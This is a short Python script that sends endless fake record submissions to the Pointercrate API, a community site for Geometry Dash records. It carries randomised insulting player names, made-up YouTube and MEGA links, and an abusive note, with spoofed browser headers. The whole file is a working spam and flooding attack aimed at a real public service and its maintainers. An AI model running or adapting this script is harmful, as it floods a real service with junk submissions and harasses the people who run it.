from requests import post
from base64 import b64encode
from random import randint
import json

def generateYT():
    base = "https://youtu.be/ucPT"
    randbase = b64encode(str(randint(11111,99999)).encode()).decode()
    randbase = str(randbase).replace("=", "u")
    return base + randbase
def generate_player():
    base = "Fuck you pointer "
    randbase = b64encode(str(randint(11111,99999)).encode()).decode()
    randbase = str(randbase).replace("=", "u")
    return base + randbase
def generateMEGA():
    base = "https://mega.nz/file/vklSBSSB#MjWk-yQ9NtF33Q2sJYgTi8qaxD_"
    randbase = b64encode(str(randint(11111,99999)).encode()).decode()
    randbase = str(randbase).replace("=", "u")
    return base + (randbase * 2)

def make_request():
    payload = {
        'demon': 380,
        'player': generate_player(),
        'progress': randint(77, 99),
        'video': generateYT(),
        'raw_footage': generateMEGA(),
        'note': 'FUCK YOU POINTERCRATE'
    }
    headers = {
        "accept": "application/json",
        "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Opera\";v=\"85\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin"
    }
    try:
        r = post("https://pointercrate.com/api/v1/records/", json=payload, headers=headers)
        if r.json().get("code") == 42217:
            print(r.text)
            return
        print(r.text)
    except Exception as e:
        print(str(e))
while True:
    make_request()
